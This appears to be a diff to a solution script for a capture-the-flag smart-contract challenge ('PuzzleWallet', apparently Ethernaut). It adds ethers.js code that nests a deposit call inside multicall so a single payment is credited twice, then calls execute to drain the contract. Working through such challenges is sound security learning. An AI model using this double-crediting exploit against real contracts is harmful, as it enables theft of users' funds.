@@ -43,10 +43,20 @@ const attackPuzzleWallet = async () => {
     // get balance of puzzle contract
     const playerBalance = await provider.getBalance(puzzleWalletAddress);
     // TODO: fill in function call signature
-    const multicallData = "";
+    const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
+    const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
+        [depositData],
+    ]);
     const tx3 = await contractPuzzleWallet.multicall([multicallData, multicallData], {
         value: ethers.utils.parseEther("0.001"),
     });
+    // check balance after here
+    // execute to drain
+    const tx4 = await contractPuzzleWallet.execute(
+        playerAddress,
+        ethers.utils.parseEther("0.002"),
+        "0x"
+    );
 };
 
 attackPuzzleWallet()
